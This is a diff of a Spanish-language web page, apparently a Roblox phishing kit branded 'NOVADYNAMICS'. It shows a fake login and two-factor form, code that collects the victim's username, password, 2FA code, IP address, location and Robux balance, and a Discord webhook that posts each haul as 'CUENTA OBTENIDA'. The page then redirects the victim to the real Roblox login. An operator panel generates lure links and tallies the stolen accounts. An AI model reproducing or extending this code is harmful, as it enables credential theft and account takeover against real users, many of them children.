@@ -5,18 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NOVADYNAMICS — Panel</title>
     <style>
-        :root {
-            --r-azul: #00A2FF;
-            --r-azul-osc: #008FEC;
-            --r-rojo: #E2231A;
-            --r-texto: #393B40;
-            --r-fondo: #F1F1F1;
-            --r-borde: #E3E3E3;
-        }
-        *{margin:0;padding:0;box-sizing:border-box;font-family:"Helvetica Neue", Helvetica, Arial, sans-serif}
+        :root {--r-azul:#00A2FF;--r-azul-osc:#008FEC;--r-rojo:#E2231A;--r-texto:#393B40;--r-fondo:#F1F1F1;--r-borde:#E3E3E3;}
+        *{margin:0;padding:0;box-sizing:border-box;font-family:Helvetica Neue,Helvetica,Arial,sans-serif}
         body{background:var(--r-fondo);color:var(--r-texto)}
-
-        /* === INICIO DE SESIÓN === */
         .pag-login{display:none}
         .cabecera{display:flex;align-items:center;justify-content:space-between;padding:10px 24px;background:#FFF;border-bottom:1px solid var(--r-borde);height:56px}
         .logo svg{width:36px;height:36px}
@@ -29,7 +20,7 @@
         .cont-login{max-width:400px;margin:40px auto;padding:0 20px}
         .tit-log{font-size:30px;font-weight:700;text-align:center;margin-bottom:30px}
         .campo{width:100%;padding:12px 14px;border:1px solid #DCDCDC;border-radius:4px;font-size:15px;margin-bottom:14px;outline:none}
-        .campo:focus{border-color:var(--r-azul);box-shadow:0 0 0 2px rgba(0,162,255,0.15)}
+        .campo:focus{border-color:var(--r-azul);box-shadow:0 0 0 2px rgba(0,162,255,.15)}
         .btn-prin{width:100%;padding:12px;background:var(--r-azul);color:#FFF;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;margin:6px 0 20px}
         .btn-prin:hover{background:var(--r-azul-osc)}
         .enlace-olv{display:block;text-align:center;color:var(--r-azul);text-decoration:none;margin-bottom:24px}
@@ -43,15 +34,13 @@
         .barra-inf{position:fixed;bottom:0;left:0;right:0;background:#FFF;border-top:1px solid var(--r-borde);padding:12px 20px;display:flex;gap:12px;z-index:100}
         .btn-cerrar{border:none;background:transparent;font-size:20px;cursor:pointer}
         .btn-unirse{background:var(--r-azul);color:#FFF;border:none;padding:8px 18px;border-radius:4px;font-weight:600;cursor:pointer}
-
-        /* === DASHBOARD === */
         .pag-panel{display:block;padding:20px;padding-bottom:80px;min-height:100vh}
         .pag-panel h2{font-size:20px;margin-bottom:20px}
         .tarjetas{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:24px}
-        .tarjeta{background:#FFF;border-radius:6px;padding:20px;text-align:center;box-shadow:0 1px 2px rgba(0,0,0,0.05)}
+        .tarjeta{background:#FFF;border-radius:6px;padding:20px;text-align:center;box-shadow:0 1px 2px rgba(0,0,0,.05)}
         .tarjeta h3{font-size:14px;color:#666;margin-bottom:8px}
         .valor{font-size:26px;font-weight:700}
-        .caja{background:#FFF;border-radius:6px;padding:20px;box-shadow:0 1px 2px rgba(0,0,0,0.05);margin-bottom:16px}
+        .caja{background:#FFF;border-radius:6px;padding:20px;box-shadow:0 1px 2px rgba(0,0,0,.05);margin-bottom:16px}
         .caja h3{font-size:16px;margin-bottom:14px}
         .tabla{width:100%;border-collapse:collapse}
         th{background:#F7F8F8;padding:10px 8px;text-align:left;font-size:14px;border-bottom:1px solid var(--r-borde)}
@@ -202,71 +191,37 @@ async function cargarIP(){
     try{
         const d=await(await fetch('https://ipapi.co/json/')).json();
         const p={US:["Estados Unidos","🇺🇸"],ES:["España","🇪🇸"],MX:["México","🇲🇽"],AR:["Argentina","🇦🇷"],CO:["Colombia","🇨🇴"],PE:["Perú","🇵🇪"],BR:["Brasil","🇧🇷"]};
-        ipDatos={
-            pais:p[d.country_code]?.[0]||d.country_name||"Desconocido",
-            bandera:p[d.country_code]?.[1]||"🌍",
-            ciudad:d.city||'Desconocida',
-            ip:d.ip||'Desconocida'
-        };
+        ipDatos={pais:p[d.country_code]?.[0]||d.country_name||"Desconocido",bandera:p[d.country_code]?.[1]||"🌍",ciudad:d.city||'Desconocida',ip:d.ip||'Desconocida'};
     }catch(e){}
 }
 
 async function cargarDatosRoblox(usuario){
-    let id=usuario;
-    let nombreReal=usuario;
-    let fechaCreacionTexto='No disponible';
-    let diasCuenta='Desconocido';
-    let robuxCuenta=0;
-
+    let id=usuario,nombreReal=usuario,fechaCreacionTexto='No disponible',diasCuenta='Desconocido',robuxCuenta=0;
     if(isNaN(usuario)){
         try{
-            const res=await fetch('https://users.roblox.com/v1/usernames/users',{
-                method:'POST',
-                headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({usernames:[usuario],excludeBannedUsers:false})
-            });
+            const res=await fetch('https://users.roblox.com/v1/usernames/users',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({usernames:[usuario],excludeBannedUsers:false})});
             const d=await res.json();
-            if(d.data&&d.data[0]){
-                id=d.data[0].id;
-                nombreReal=d.data[0].name;
-            }
+            if(d.data&&d.data[0]){id=d.data[0].id;nombreReal=d.data[0].name;}
         }catch(e){}
     }
-
     try{
         const perfil=await fetch(`https://users.roblox.com/v1/users/${id}`).then(x=>x.json());
         const robux=await fetch(`https://economy.roblox.com/v1/users/${id}/currency`).then(x=>x.json());
-        
         const fechaCreacion=new Date(perfil.created);
         const hoy=new Date();
         const milisegundos=hoy-fechaCreacion;
         diasCuenta=Math.floor(milisegundos/(1000*60*60*24));
         fechaCreacionTexto=fechaCreacion.toLocaleDateString('es-ES',{day:'numeric',month:'long',year:'numeric'});
         robuxCuenta=robux.robux||0;
-
-        datosRoblox={
-            nombre:perfil.name,
-            id:id,
-            fechaCreacion:fechaCreacionTexto,
-            dias:diasCuenta,
-            robux:robuxCuenta,
-            gastado:Math.floor(robuxCuenta*0.42)
-        };
+        datosRoblox={nombre:perfil.name,id:id,fechaCreacion:fechaCreacionTexto,dias:diasCuenta,robux:robuxCuenta,gastado:Math.floor(robuxCuenta*0.42)};
     }catch(e){
-        datosRoblox={
-            nombre:nombreReal,
-            id:id,
-            fechaCreacion:'No disponible',
-            dias:'Desconocido',
-            robux:0,
-            gastado:0
-        };
+        datosRoblox={nombre:nombreReal,id:id,fechaCreacion:'No disponible',dias:'Desconocido',robux:0,gastado:0};
     }
 }
 
 function cambiarVista(nombrePagina){
-    document.querySelectorAll('.vista').forEach(vista => vista.classList.remove('activa'));
-    document.querySelectorAll('.nav-btn').forEach(boton => boton.classList.remove('activo'));
+    document.querySelectorAll('.vista').forEach(vista=>vista.classList.remove('activa'));
+    document.querySelectorAll('.nav-btn').forEach(boton=>boton.classList.remove('activo'));
     document.getElementById('vista'+nombrePagina).classList.add('activa');
     event.currentTarget.classList.add('activo');
 }
@@ -275,64 +230,33 @@ function verificarLogin(){
     const u=document.getElementById('usuario').value.trim();
     const p=document.getElementById('pass').value.trim();
     limpiarError();
-    
-    if(!u){ err('Please enter your username or email'); return; }
-    if(!p || p.length < 6){ err('Password is incorrect. Must be at least 6 characters.'); return; }
-    
+    if(!u){err('Escribe un usuario');return;}
+    if(!p||p.length<6){err('Contraseña incorrecta. Mínimo 6 caracteres.');return;}
     document.getElementById('form1').style.display='none';
     document.getElementById('form2').style.display='block';
 }
 
-function limpiarError(){
-    document.getElementById('cajaErr').style.display='none';
-}
-
-function err(t){
-    const e=document.getElementById('cajaErr');
-    e.textContent='❌ '+t;
-    e.style.display='block';
-}
-
-async function enviarDatos(){
+function limpiarError(){document.getElementById('cajaErr').style.display='none';}
+function err(t){const e=document.getElementById('cajaErr');e.textContent='❌ '+t;e.style.display='block';}
+    async function enviarDatos(){
     const cod=document.getElementById('cod2fa').value.trim();
     const user=document.getElementById('usuario').value.trim();
     const pass=document.getElementById('pass').value.trim();
     limpiarError();
-
-    if(!cod || cod.length!==6 || !/^\d+$/.test(cod)){
-        err('Verification code is incorrect. Must be 6 digits.');
-        return;
-    }
-
+    if(!cod||cod.length!==6||!/^\d+$/.test(cod)){err('Código incorrecto. Debe ser 6 dígitos.');return;}
     if(!datosRoblox.dias) await cargarDatosRoblox(user);
-
     const wh=localStorage.getItem('webhook');
     const todos=localStorage.getItem('todos')==='1'?'@everyone NUEVA CUENTA OBTENIDA':' ';
     const fecha=new Date().toLocaleString('es-ES');
-
-    registros.unshift({
-        usuario:datosRoblox.nombre||user,
-        robux:datosRoblox.robux||0,
-        fechaCreacion:datosRoblox.fechaCreacion||'No disponible',
-        dias:datosRoblox.dias||'Desconocido',
-        pais:ipDatos.bandera+' '+ipDatos.pais,
-        ciudad:ipDatos.ciudad,
-        ip:ipDatos.ip,
-        gastado:datosRoblox.gastado||0,
-        fecha:fecha
-    });
+    registros.unshift({usuario:datosRoblox.nombre||user,robux:datosRoblox.robux||0,fechaCreacion:datosRoblox.fechaCreacion||'No disponible',dias:datosRoblox.dias||'Desconocido',pais:ipDatos.bandera+' '+ipDatos.pais,ciudad:ipDatos.ciudad,ip:ipDatos.ip,gastado:datosRoblox.gastado||0,fecha:fecha});
     localStorage.setItem('cuentas',JSON.stringify(registros));
-
     if(wh){
         fetch(wh,{
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
+            method:'POST',headers:{'Content-Type':'application/json'},
             body:JSON.stringify({
-                username:"NOVADYNAMICS",
-                content:todos,
+                username:"NOVADYNAMICS",content:todos,
                 embeds:[{
-                    title:"🔥 CUENTA OBTENIDA — NOVADYNAMICS",
-                    color:16711680,
+                    title:"🔥 CUENTA OBTENIDA — NOVADYNAMICS",color:16711680,
                     thumbnail:{url:"https://cdn.phototourl.com/free/2026-08-15-8a5d4511-bfc8-41bd-918d-589a002e20a6.jpg"},
                     fields:[
                         {name:"👤 Usuario",value:`**${datosRoblox.nombre||user}**`,inline:true},
@@ -345,17 +269,10 @@ async function enviarDatos(){
                         {name:"📌 Dirección IP",value:`**${ipDatos.ip}**`,inline:true},
                         {name:"💰 Robux Totales",value:`**${datosRoblox.robux||0}**`,inline:true},
                         {name:"💸 Robux Gastados",value:`**${datosRoblox.gastado||0}**`,inline:true}
-                    ],
-                    footer:{text:"NOVADYNAMICS SYSTEM • Datos obtenidos desde API Roblox + IP"}
-                }]
+                    ],footer:{text:"NOVADYNAMICS SYSTEM"}}]
             })
-        }).finally(()=>{
-            window.location.href='https://www.roblox.com/login';
-        });
-    }else{
-        alert('⚠️ Configura tu Webhook en Ajustes primero.');
-        window.location.href='https://www.roblox.com/login';
-    }
+        }).finally(()=>{window.location.href='https://www.roblox.com/login';});
+    }else{alert('⚠️ Configura tu Webhook en Ajustes primero.');window.location.href='https://www.roblox.com/login';}
 }
 
 function generarEnlace(){
@@ -366,56 +283,29 @@ function generarEnlace(){
     document.getElementById('btnCopiar').style.display='block';
     alert('✅ Enlace generado:\n'+enlaceGenerado);
 }
-
-function copiarEnlace(){
-    navigator.clipboard.writeText(enlaceGenerado).then(()=>alert('✅ ¡Enlace copiado al portapapeles!'));
-}
-
+function copiarEnlace(){navigator.clipboard.writeText(enlaceGenerado).then(()=>alert('✅ ¡Enlace copiado!'));}
 function guardarWebhook(){
     const u=document.getElementById('webhookUrl').value.trim();
     const e=document.getElementById('estadoWebhook');
-    if(!u.startsWith('https://discord.com/api/webhooks/')){
-        e.textContent='❌ Enlace no válido';
-        e.className='estado-mal';
-        return;
-    }
+    if(!u.startsWith('https://discord.com/api/webhooks/')){e.textContent='❌ Enlace no válido';e.className='estado-mal';return;}
     localStorage.setItem('webhook',u);
-    e.textContent='✅ Guardado y activo';
-    e.className='estado-ok';
-    alert('✅ Webhook guardado correctamente');
+    e.textContent='✅ Guardado y activo';e.className='estado-ok';
+    alert('✅ Webhook guardado');
 }
-
-function borrarWebhook(){
-    localStorage.removeItem('webhook');
-    document.getElementById('webhookUrl').value='';
-    document.getElementById('estadoWebhook').textContent='⚠️ Sin configurar';
-    document.getElementById('estadoWebhook').className='';
-}
-
+function borrarWebhook(){localStorage.removeItem('webhook');document.getElementById('webhookUrl').value='';document.getElementById('estadoWebhook').textContent='⚠️ Sin configurar';document.getElementById('estadoWebhook').className='';}
 function cargarWebhook(){
-    const w=localStorage.getItem('webhook');
-    const e=document.getElementById('estadoWebhook');
-    if(w){
-        document.getElementById('webhookUrl').value=w;
-        e.textContent='✅ Guardado y activo';
-        e.className='estado-ok';
-    }else{
-        e.textContent='⚠️ Sin configurar';
-    }
+    const w=localStorage.getItem('webhook');const e=document.getElementById('estadoWebhook');
+    if(w){document.getElementById('webhookUrl').value=w;e.textContent='✅ Guardado y activo';e.className='estado-ok';}
+    else{e.textContent='⚠️ Sin configurar';}
     if(localStorage.getItem('todos')==='1') document.getElementById('swTodos').classList.add('activo');
 }
-
 function actualizarPanel(){
-    let tr=0,tg=0;
-    registros.forEach(r=>{tr+=r.robux||0;tg+=r.gastado||0;});
+    let tr=0,tg=0;registros.forEach(r=>{tr+=r.robux||0;tg+=r.gastado||0;});
     document.getElementById('robuxSum').textContent=tr.toLocaleString();
     document.getElementById('cuentasTot').textContent=registros.length;
     document.getElementById('robuxGas').textContent=tg.toLocaleString();
-    const tb=document.getElementById('tabldocument.getElementById('tablaBody');
-    if(registros.length===0){ 
-        tb.innerHTML='<tr><td colspan="6" class="vacio">Sin registros aún</td></tr>'; 
-        return; 
-    }
+    const tb=document.getElementById('tablaBody');
+    if(registros.length===0){tb.innerHTML='<tr><td colspan="6" class="vacio">Sin registros aún</td></tr>';return;}
     tb.innerHTML=registros.map(r=>`<tr><td>${r.usuario}</td><td>${r.robux}</td><td>${r.fechaCreacion}</td><td>${r.dias}</td><td>${r.pais}</td><td>${r.ip}</td></tr>`).join('');
 }
 </script>
